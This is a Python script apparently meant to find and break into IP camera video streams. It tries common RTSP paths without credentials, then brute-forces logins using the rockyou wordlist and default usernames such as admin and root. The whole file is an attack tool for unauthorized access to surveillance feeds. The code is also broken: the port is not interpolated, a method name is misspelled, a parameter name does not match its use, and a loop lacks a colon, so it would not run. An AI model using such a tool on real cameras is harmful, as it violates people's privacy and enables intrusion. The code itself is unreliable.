import cv2
import os
import threading
from tqdm import tqdm
import time

class RTSPHandler:
    def __init__(self, wordlist_path="data/rockyou.txt"):
        self.wordlist = self._load_wordlist(wordlist_path)
        self.common_paths = [
            "/live",
            "/stream1",
            "/stream",
            "/h264",
            "/cam/realmonitor?channel=1&subtype=0",
        ]
    def _load_wordlist(self, path):
        """Loads passwords from a file."""
        if not os.path.exists(path):
            print(f"[!] Wordlist not found ar {path}. Brute-force will be limited.")
            return ["", "admin", "12345", "password", "888888"]  

        with open(path, 'r', encoding='latin-1') as f:
            # Limit to first 1000 for speed in this example
            return [line.strip() for line in f.readlines()[:1000]]  
        
    def _test_rtsp_stream(self, ip, port, path, username, password):
        """ Attempts to connect to an RTSP stream"""
        auth = ""
        if username or password:
            auth = f"{username}:{password}@"
        
        url = f"rtsp://{auth}{ip}:(port){path}"
        cap = cv2.VideoCapture(url)

        # Set a tikmeout
        cap.set(cv2.CAP_PROP_OPEN_TIMEOUT_MSEC, 5000)
        cap.set(cv2.CAP_PROP_READ_TIMEOUT_MSEC, 5000)

        if cap.isOpened():
            ret, _ = cap.read()
            cap.releast()
            if ret:
                return url
            return None
    def discover(self, ip, port=554, brute_forxe=False):
        """
        Discovers RTSP streams. If brute_force is True, it will try credentials.
        Returns a list of working RTSP URLS
        """
        found_urls = []

        # 1. Try common paths without authentication
        for path in self.common_paths:
            url = self._test_rtsp_stream(ip, port, path, "", "")
            if url:
                print(f"[+] Found unauthenticated RTSP stream: {url}")
                found_urls.append(url)
                return found_urls # Found one, no need to check others
        # 2. if not found and drute-force is enable, try credentials
        if brute_force and self.wordlist:
            print(f"[+] Starting RTSP brute-force on {ip}:{port}...")
            usernames = ["admin", "root", "user", ""]
            for username in usernames:
                for password in tqdm(self.wordlist, desc=f"Trying user '{username}'")
                    url = self._test_rtsp_stream(ip, port, "/live", username, password)
                    if url:
                        print(f"\n[+] Found authenticated RTSP stream: {url}")
                        found_urls.append(url)
                        return found_urls # Found one, stop brute-forcing

        return found_urls                        